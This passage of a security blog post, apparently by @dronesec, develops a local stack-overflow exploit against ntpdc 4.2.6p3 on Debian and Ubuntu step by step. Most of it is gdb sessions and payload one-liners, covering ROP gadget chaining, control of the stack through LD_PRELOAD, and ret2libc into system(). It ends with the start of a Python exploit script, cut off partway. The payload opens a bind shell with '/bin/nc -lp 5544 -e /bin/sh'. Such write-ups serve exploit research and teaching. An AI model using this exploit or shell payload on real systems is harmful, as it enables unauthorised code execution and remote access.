<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ python -c 'print "A"*485 + "C"*4 + "A"*79 + "\xcd\xa9\x06\x08" + "C"*600' &gt; crash.info
</span><span class='line'>$ gdb -q /usr/bin/ntpdc
</span><span class='line'>$ r &lt; crash.info
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>[----------------------------------registers-----------------------------------]
</span><span class='line'>EAX: 0x6c61636f ('ocal')
</span><span class='line'>EBX: 0xb7fabff4 --&gt; 0x1fe40 
</span><span class='line'>ECX: 0xb7dc13c0 --&gt; 0x0 
</span><span class='line'>EDX: 0x43434343 ('CCCC')
</span><span class='line'>ESI: 0x806a9cd --&gt; 0x0 
</span><span class='line'>EDI: 0x0 
</span><span class='line'>EBP: 0x0 
</span><span class='line'>ESP: 0xbffff3cc --&gt; 0xb7fa1d8d (&lt;el_gets+45&gt;:   cmp    eax,0x1)
</span><span class='line'>EIP: 0x43434343 ('CCCC')
</span><span class='line'>EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
</span><span class='line'>[-------------------------------------code-------------------------------------]
</span><span class='line'>Invalid $PC address: 0x43434343
</span><span class='line'>[------------------------------------stack-------------------------------------]
</span><span class='line'>0000| 0xbffff3cc --&gt; 0xb7fa1d8d (&lt;el_gets+45&gt;:  cmp    eax,0x1)
</span><span class='line'>0004| 0xbffff3d0 --&gt; 0x806a9cd --&gt; 0x0 
</span><span class='line'>0008| 0xbffff3d4 --&gt; 0x0 
</span><span class='line'>0012| 0xbffff3d8 --&gt; 0x8069108 --&gt; 0xb7d7a4d0 (push   ebx)
</span><span class='line'>0016| 0xbffff3dc --&gt; 0x0 
</span><span class='line'>0020| 0xbffff3e0 --&gt; 0xb7c677f4 --&gt; 0x1cce 
</span><span class='line'>0024| 0xbffff3e4 --&gt; 0x807b6f8 ('A' &lt;repeats 200 times&gt;...)
</span><span class='line'>0028| 0xbffff3e8 --&gt; 0x807d3b0 ('A' &lt;repeats 200 times&gt;...)
</span><span class='line'>[------------------------------------------------------------------------------]
</span><span class='line'>Legend: code, data, rodata, value
</span><span class='line'>Stopped reason: SIGSEGV
</span><span class='line'>0x43434343 in ?? ()</span></code></pre></td></tr></table></div></figure>


<p>Now that we&rsquo;ve got EIP, it&rsquo;s a simple matter of stack pivoting to execute a ROP payload.  Let&rsquo;s figure out where that <code>"C"*600</code> lands in memory and redirect EIP there:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ searchmem 0x43434343
</span><span class='line'>Searching for '0x43434343' in: None ranges
</span><span class='line'>Found 755 results, display max 256 items:
</span><span class='line'> ntpdc : 0x806ace5 ("CCCC", 'A' &lt;repeats 79 times&gt;, "\006\b", 'C' &lt;repeats 113 times&gt;...)
</span><span class='line'> ntpdc : 0x806ad3c ('C' &lt;repeats 200 times&gt;...)
</span><span class='line'> [snip]</span></code></pre></td></tr></table></div></figure>


<p>And we&rsquo;ll fill it with <code>\xcc</code> to ensure we&rsquo;re there (theoretically triggering NX):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ python -c 'print "A"*485 + "\x3c\xad\x06\x08" + "A"*79 + "\xcd\xa9\x06\x08" + "\xcc"*600' &gt; crash.info
</span><span class='line'>$ gdb -q /usr/bin/ntpdc
</span><span class='line'>Reading symbols from /usr/bin/ntpdc...(no debugging symbols found)...done.
</span><span class='line'>gdb-peda$ r &lt; crash.info 
</span><span class='line'>[snip]
</span><span class='line'>Program received signal SIGTRAP, Trace/breakpoint trap.
</span><span class='line'>[----------------------------------registers-----------------------------------]
</span><span class='line'>EAX: 0x6c61636f ('ocal')
</span><span class='line'>EBX: 0xb7fabff4 --&gt; 0x1fe40 
</span><span class='line'>ECX: 0xb7dc13c0 --&gt; 0x0 
</span><span class='line'>EDX: 0xcccccccc 
</span><span class='line'>ESI: 0x806a9cd --&gt; 0x0 
</span><span class='line'>EDI: 0x0 
</span><span class='line'>EBP: 0x0 
</span><span class='line'>ESP: 0xbffff3ec --&gt; 0xb7fa1d8d (&lt;el_gets+45&gt;:   cmp    eax,0x1)
</span><span class='line'>EIP: 0x806ad3d --&gt; 0xcccccccc
</span><span class='line'>EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
</span><span class='line'>[-------------------------------------code-------------------------------------]
</span><span class='line'>   0x806ad38:   int    0xa9
</span><span class='line'>   0x806ad3a:   push   es
</span><span class='line'>   0x806ad3b:   or     ah,cl
</span><span class='line'>=&gt; 0x806ad3d:   int3   
</span><span class='line'>   0x806ad3e:   int3   
</span><span class='line'>   0x806ad3f:   int3   
</span><span class='line'>   0x806ad40:   int3   
</span><span class='line'>   0x806ad41:   int3
</span><span class='line'>[------------------------------------stack-------------------------------------]
</span><span class='line'>0000| 0xbffff3ec --&gt; 0xb7fa1d8d (&lt;el_gets+45&gt;:  cmp    eax,0x1)
</span><span class='line'>0004| 0xbffff3f0 --&gt; 0x806a9cd --&gt; 0x0 
</span><span class='line'>0008| 0xbffff3f4 --&gt; 0x0 
</span><span class='line'>0012| 0xbffff3f8 --&gt; 0x8069108 --&gt; 0xb7d7a4d0 (push   ebx)
</span><span class='line'>0016| 0xbffff3fc --&gt; 0x0 
</span><span class='line'>0020| 0xbffff400 --&gt; 0xb7c677f4 --&gt; 0x1cce 
</span><span class='line'>0024| 0xbffff404 --&gt; 0x807b9d0 ('A' &lt;repeats 200 times&gt;...)
</span><span class='line'>0028| 0xbffff408 --&gt; 0x807d688 ('A' &lt;repeats 200 times&gt;...)
</span><span class='line'>[------------------------------------------------------------------------------]
</span><span class='line'>Legend: code, data, rodata, value
</span><span class='line'>Stopped reason: SIGTRAP
</span><span class='line'>0x0806ad3d in ?? ()
</span><span class='line'>gdb-peda$ </span></code></pre></td></tr></table></div></figure>


<p>Er, what?  It appears to be executing code in BSS! Recall the output of paxtest/checksec/hardening-check from earlier, NX was clearly enabled.  This took me a few hours to figure out, but it ultimately came down to Debian not distributing x86 images with PAE, or Physical Address Extension.  PAE is a kernel feature that allows 32-bit CPU&rsquo;s to access physical page tables and doubling each entry in the page table and page directory.  This third level of paging and increased entry size is required for NX on x86 architectures because NX adds a single &lsquo;dont execute&rsquo; bit to the page table.  You can read more about PAE <a href="http://en.wikipedia.org/wiki/Physical_Address_Extension">here</a>, and the original NX patch <a href="http://lwn.net/Articles/87808/">here</a>.</p>

<p>This flag can be tested for with a simple grep of <code>/proc/cpuinfo</code>; on a fresh install of Debian 7, a grep for PAE will turn up empty, but on something with support, such as Ubuntu, you&rsquo;ll get the flag back.</p>

<p>Because I had come this far already, I figured I might as well get the exploit working.  At this point it was simple, anyway:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ python -c 'print "A"*485 + "\x3c\xad\x06\x08" + "A"*79 + "\xcd\xa9\x06\x08" + "\x90"*4 + "\x68\xec\xf7\xff\xbf\x68\x70\xe2\xc8\xb7\x68\x30\xac\xc9\xb7\xc3"' &gt; input2.file 
</span><span class='line'>$ gdb -q /usr/bin/ntpdc
</span><span class='line'>Reading symbols from /usr/bin/ntpdc...(no debugging symbols found)...done.
</span><span class='line'>gdb-peda$ r &lt; input.file 
</span><span class='line'>[Thread debugging using libthread_db enabled]
</span><span class='line'>Using host libthread_db library "/lib/i386-linux-gnu/i686/cmov/libthread_db.so.1".
</span><span class='line'>***Command `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&lt;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAhhph0' unknown
</span><span class='line'>[New process 4396]
</span><span class='line'>[Thread debugging using libthread_db enabled]
</span><span class='line'>Using host libthread_db library "/lib/i386-linux-gnu/i686/cmov/libthread_db.so.1".
</span><span class='line'>process 4396 is executing new program: /bin/dash
</span><span class='line'>[New process 4397]
</span><span class='line'>process 4397 is executing new program: /bin/nc.traditional</span></code></pre></td></tr></table></div></figure>


<p>This uses a simple <code>system</code> payload with hard-coded addresses, because at this point it&rsquo;s an old-school, CTF-style exploit.  And it works.  With this trivial PoC working, I decided to check another box I had to verify this is a common distribution method.  An Ubuntu VM said otherwise:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ uname -a
</span><span class='line'>Linux bryan-VirtualBox 3.2.0-74-generic #109-Ubuntu SMP Tue Dec 9 16:47:54 UTC 2014 i686 i686 i386 GNU/Linux
</span><span class='line'>$ ./checksec.sh --file /usr/bin/ntpdc
</span><span class='line'>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
</span><span class='line'>Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   /usr/bin/ntpdc
</span><span class='line'>$ cat /proc/sys/kernel/randomize_va_space
</span><span class='line'>2</span></code></pre></td></tr></table></div></figure>


<p>Quite a different story.  We need to bypass full RELRO (no GOT overwrites), PIE+ASLR, NX, SSP, and ASCII armor.  In our current state, things are looking pretty grim.  As an aside, it&rsquo;s important to remember that because this is a local exploit, the attacker is assumed to have limited control over the system.  Ergo, an attacker may inspect and modify the system in the same manner a limited user could.  This becomes important with a few techniques we&rsquo;re going to use moving forward.</p>

<p>Our first priority is stack pivoting; we won&rsquo;t be able to ROP to victory without control over the stack.  There are a few options for this, but the easiest option is likely going to be an <code>ADD ESP, ?</code> gadget.  The problem with this being that we need to have some sort of control over the stack or be able to modify ESP somewhere into BSS that we control.  Looking at the output of <code>ropgadget</code>, we&rsquo;ve got 36 options, almost all of which are of the form <code>ADD ESP, ?</code>.</p>

<p>After looking through the list, I determined that none of the values led to control over the stack; in fact, nothing I injected landed on the stack.  I did note, however, the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ x/6i 0x800143e0
</span><span class='line'>   0x800143e0: add    esp,0x256c
</span><span class='line'>   0x800143e6: pop    ebx
</span><span class='line'>   0x800143e7: pop    esi
</span><span class='line'>   0x800143e8: pop    edi
</span><span class='line'>   0x800143e9: pop    ebp
</span><span class='line'>   0x800143ea: ret 
</span><span class='line'>gdb-peda$ x/30s $esp+0x256c
</span><span class='line'>0xbffff3a4:  "-1420310755.557158-104120677"
</span><span class='line'>0xbffff3c1:  "WINDOWID=69206020"
</span><span class='line'>0xbffff3d3:  "GNOME_KEYRING_CONTROL=/tmp/keyring-iBX3uM"
</span><span class='line'>0xbffff3fd:  "GTK_MODULES=canberra-gtk-module:canberra-gtk-module"</span></code></pre></td></tr></table></div></figure>


<p>These are environmental variables passed into the application and located on the program stack.  Using the ROP gadget <code>ADD ESP, 0x256c</code>, followed by a series of register POPs, we could land here.  Controlling this is easy with the help of LD_PRELOAD, a neat trick <a href="http://vulnfactory.org/blog/2010/04/08/controlling-uninitialized-memory-with-ld_preload/">documented</a> by Dan Rosenberg in 2010.  By exporting LD_PRELOAD, we can control uninitialized data located on the stack, as follows:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ export LD_PRELOAD=`python -c 'print "A"*10000'`
</span><span class='line'>$ gdb -q /usr/bin/ntpdc
</span><span class='line'>gdb-peda$ r &lt; input.file
</span><span class='line'>[..snip..]
</span><span class='line'>gdb-peda$ x/10wx $esp+0x256c
</span><span class='line'>0xbfffedc8: 0x41414141  0x41414141  0x41414141  0x41414141
</span><span class='line'>0xbfffedd8: 0x41414141  0x41414141  0x41414141  0x41414141
</span><span class='line'>0xbfffede8: 0x41414141  0x41414141
</span><span class='line'>gdb-peda$ </span></code></pre></td></tr></table></div></figure>


<p>Using some pattern_create/offset magic, we can find the offset in our LD_PRELOAD string and take control over EIP and the stack:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ export LD_PRELOAD=`python -c 'print "A"*8490 + "AAAA" + "BBBB"'`
</span><span class='line'>$ python -c "print 'A'*485 + '\xe0\x43\x01\x80' + 'A'*79 + '\x8d\x67\x02\x80' + 'B'*600" &gt; input.file
</span><span class='line'>$ gdb -q /usr/bin/ntpdc
</span><span class='line'>gdb-peda$ r &lt; input.file
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>[----------------------------------registers-----------------------------------]
</span><span class='line'>EAX: 0x6c61636f ('ocal')
</span><span class='line'>EBX: 0x41414141 ('AAAA')
</span><span class='line'>ECX: 0x13560 
</span><span class='line'>EDX: 0x42424242 ('BBBB')
</span><span class='line'>ESI: 0x41414141 ('AAAA')
</span><span class='line'>EDI: 0x41414141 ('AAAA')
</span><span class='line'>EBP: 0x41414141 ('AAAA')
</span><span class='line'>ESP: 0xbffff3bc ("BBBB")
</span><span class='line'>EIP: 0x41414141 ('AAAA')
</span><span class='line'>EFLAGS: 0x10292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
</span><span class='line'>[-------------------------------------code-------------------------------------]
</span><span class='line'>Invalid $PC address: 0x41414141
</span><span class='line'>[------------------------------------stack-------------------------------------]
</span><span class='line'>0000| 0xbffff3bc ("BBBB")
</span><span class='line'>0004| 0xbffff3c0 --&gt; 0x4e495700 ('')
</span><span class='line'>0008| 0xbffff3c4 ("DOWID=69206020")
</span><span class='line'>0012| 0xbffff3c8 ("D=69206020")
</span><span class='line'>0016| 0xbffff3cc ("206020")
</span><span class='line'>0020| 0xbffff3d0 --&gt; 0x47003032 ('20')
</span><span class='line'>0024| 0xbffff3d4 ("NOME_KEYRING_CONTROL=/tmp/keyring-iBX3uM")
</span><span class='line'>0028| 0xbffff3d8 ("_KEYRING_CONTROL=/tmp/keyring-iBX3uM")
</span><span class='line'>[------------------------------------------------------------------------------]
</span><span class='line'>Legend: code, data, rodata, value
</span><span class='line'>Stopped reason: SIGSEGV
</span><span class='line'>0x41414141 in ?? ()</span></code></pre></td></tr></table></div></figure>


<p>This gives us EIP, control over the stack, and control over a decent number of registers; however, the LD_PRELOAD trick is extremely sensitive to stack shifting which represents a pretty big problem for exploit portability.  For now, I&rsquo;m going to forget about it; chances are we could brute force the offset, if necessary, or simply invoke the application with <code>env -i</code>.</p>

<p>From here, we need to figure out a ROP payload.  The easiest payload I can think of is a simple ret2libc.  Unfortunately, ASCII armor null bytes all of them:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>gdb-peda$ vmmap
</span><span class='line'>
</span><span class='line'>0x00327000 0x004cb000 r-xp /lib/i386-linux-gnu/libc-2.15.so
</span><span class='line'>0x004cb000 0x004cd000 r--p /lib/i386-linux-gnu/libc-2.15.so
</span><span class='line'>0x004cd000 0x004ce000 rw-p /lib/i386-linux-gnu/libc-2.15.so
</span><span class='line'>gdb-peda$ p system
</span><span class='line'>$1 = {&lt;text variable, no debug info&gt;} 0x366060 &lt;system&gt;
</span><span class='line'>gdb-peda$ </span></code></pre></td></tr></table></div></figure>


<p>One idea I had was to simply construct the address in memory, then call it.  Using <a href="http://github.com/JonathanSalwan/ROPgadget">ROPgadget</a>, I hunted for ADD/SUB instructions that modified any registers we controlled.  Eventually, I discovered this gem:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>0x800138f2: add edi, esi; ret 0;
</span><span class='line'>0x80022073: call edi</span></code></pre></td></tr></table></div></figure>


<p>Using the above, we could pop controlled, non-null values into EDI/ESI, that when added equaled <code>0x366060 &lt;system&gt;</code>.  Many values will work, but I chose <code>0xeeffffff + 0x11366061</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>EAX: 0x6c61636f ('ocal')
</span><span class='line'>EBX: 0x41414141 ('AAAA')
</span><span class='line'>ECX: 0x12f00 
</span><span class='line'>EDX: 0x42424242 ('BBBB')
</span><span class='line'>ESI: 0xeeffffff 
</span><span class='line'>EDI: 0x11366061 
</span><span class='line'>EBP: 0x41414141 ('AAAA')
</span><span class='line'>ESP: 0xbfffefb8 --&gt; 0x800138f2 (add    edi,esi)
</span><span class='line'>EIP: 0x800143ea (ret)
</span><span class='line'>EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
</span><span class='line'>[-------------------------------------code-------------------------------------]
</span><span class='line'>   0x800143e7: pop    esi
</span><span class='line'>   0x800143e8: pop    edi
</span><span class='line'>   0x800143e9: pop    ebp
</span><span class='line'>=&gt; 0x800143ea: ret    
</span><span class='line'>   0x800143eb: nop
</span><span class='line'>   0x800143ec: lea    esi,[esi+eiz*1+0x0]
</span><span class='line'>   0x800143f0: mov    DWORD PTR [esp],ebp
</span><span class='line'>   0x800143f3: call   0x80018d20
</span><span class='line'>[------------------------------------stack-------------------------------------]
</span><span class='line'>0000| 0xbfffefb8 --&gt; 0x800138f2 (add    edi,esi)
</span><span class='line'>0004| 0xbfffefbc --&gt; 0x80022073 --&gt; 0xd7ff 
</span><span class='line'>0008| 0xbfffefc0 ('C' &lt;repeats 200 times&gt;...)
</span><span class='line'>0012| 0xbfffefc4 ('C' &lt;repeats 200 times&gt;...)
</span><span class='line'>0016| 0xbfffefc8 ('C' &lt;repeats 200 times&gt;...)
</span><span class='line'>0020| 0xbfffefcc ('C' &lt;repeats 200 times&gt;...)
</span><span class='line'>0024| 0xbfffefd0 ('C' &lt;repeats 200 times&gt;...)
</span><span class='line'>0028| 0xbfffefd4 ('C' &lt;repeats 200 times&gt;...)
</span><span class='line'>[------------------------------------------------------------------------------]
</span><span class='line'>Legend: code, data, rodata, value
</span><span class='line'>0x800143ea in ?? ()</span></code></pre></td></tr></table></div></figure>


<p>As shown above, we&rsquo;ve got our two values in EDI/ESI and are returning to our <code>ADD EDI, ESI</code> gadget.  Once this completes, we return to our <code>CALL EDI</code> gadget, which will jump into <code>system</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>EDI: 0x366060 (&lt;system&gt;:   sub    esp,0x1c)
</span><span class='line'>EBP: 0x41414141 ('AAAA')
</span><span class='line'>ESP: 0xbfffefc0 --&gt; 0xbffff60d ("/bin/nc -lp 5544 -e /bin/sh")
</span><span class='line'>EIP: 0x80022073 --&gt; 0xd7ff
</span><span class='line'>EFLAGS: 0x217 (CARRY PARITY ADJUST zero sign trap INTERRUPT direction overflow)
</span><span class='line'>[-------------------------------------code-------------------------------------]
</span><span class='line'>=&gt; 0x80022073: call   edi</span></code></pre></td></tr></table></div></figure>


<p>Recall the format of a ret2libc: <code>[system() address | exit() | shell command]</code>; therefore, we need to stick a bogus <code>exit</code> address (in my case, junk) as well as the address of a command.  Also remember, however, that <code>CALL EDI</code> is essentially a macro for <code>PUSH EIP+2 ; JMP EDI</code>.  This means that our stack will be tainted with the address @ EIP+2.  Thanks to this, we don&rsquo;t really need to add an exit address, as one will be added for us.  There are, unfortunately, no <code>JMP EDI</code> gadgets in the binary, so we&rsquo;re stuck with a messy exit.</p>

<p>This culminates in:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ export LD_PRELOAD=`python -c 'print "A"*8472 + "\xff\xff\xff\xee" + "\x61\x60\x36\x11" + "AAAA" + "\xf2\x38\x01\x80" + "\x73\x20\x02\x80" + "\x0d\xf6\xff\xbf" + "C"*1492'`
</span><span class='line'>$ gdb -q /usr/bin/ntpdc
</span><span class='line'>gdb-peda$ r &lt; input.file
</span><span class='line'>[snip all the LD_PRELOAD crap]
</span><span class='line'>[New process 31184]
</span><span class='line'>[Thread debugging using libthread_db enabled]
</span><span class='line'>Using host libthread_db library "/lib/i386-linux-gnu/libthread_db.so.1".
</span><span class='line'>process 31184 is executing new program: /bin/dash
</span><span class='line'>[New process 31185]
</span><span class='line'>process 31185 is executing new program: /bin/nc.traditional</span></code></pre></td></tr></table></div></figure>


<p>Success!  Though this is a very dirty hack, and makes no claim of portability, it works.  As noted previously, we can brute force the image base and stack offsets, though we can also execute the binary with an empty environment and no stack tampering with <code>env -i</code>, giving us a much higher chance of hitting our mark.</p>

<p>Overall, this was quite a bit of fun.  Although ASLR/PIE still poses an issue, this is a local bug that brute forcing and a little investigation can&rsquo;t take care of.  NX/RELRO/Canary/SSP/ASCII Armor have all been successfully neutralized.  I hacked up a PoC that <em>should</em> work on Ubuntu boxes as configured, but it brute forces offsets.  Test runs show it can take up to 2 hours to successfully pop a box.  Full code can be found below.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>from os import system, environ
</span><span class='line'>from struct import pack
</span><span class='line'>import sys
</span><span class='line'>
</span><span class='line'>#
</span><span class='line'># ntpdc 4.2.6p3 bof
</span><span class='line'># @dronesec
</span><span class='line'># tested on x86 Ubuntu 12.04.5 LTS
</span><span class='line'>#
</span><span class='line'>
</span><span class='line'>IMAGE_BASE = 0x80000000
</span><span class='line'>LD_INITIAL_OFFSET = 8900
</span><span class='line'>LD_TAIL_OFFSET = 1400
</span><span class='line'>
</span><span class='line'>sploit = "\x41" * 485        # junk 
</span><span class='line'>sploit += pack("&lt;I", IMAGE_BASE + 0x000143e0) # eip
</span><span class='line'>sploit += "\x41" * 79        # junk 
</span><span class='line'>sploit += pack("&lt;I", IMAGE_BASE + 0x0002678d) # location -0x14/-0x318 from shellcode
</span><span class='line'>
</span><span class='line'>ld_pl = ""
</span><span class='line'>ld_pl += pack("&lt;I", 0xeeffffff) # ESI
</span><span class='line'>ld_pl += pack("&lt;I", 0x11366061) # EDI
</span><span class='line'>ld_pl += pack("&lt;I", 0x41414141) # EBP
</span><span class='line'>ld_pl += pack("&lt;I", IMAGE_BASE + 0x000138f2) # ADD EDI, ESI; RET
</span><span class='line'>ld_pl += pack("&lt;I", IMAGE_BASE + 0x00022073) # CALL EDI
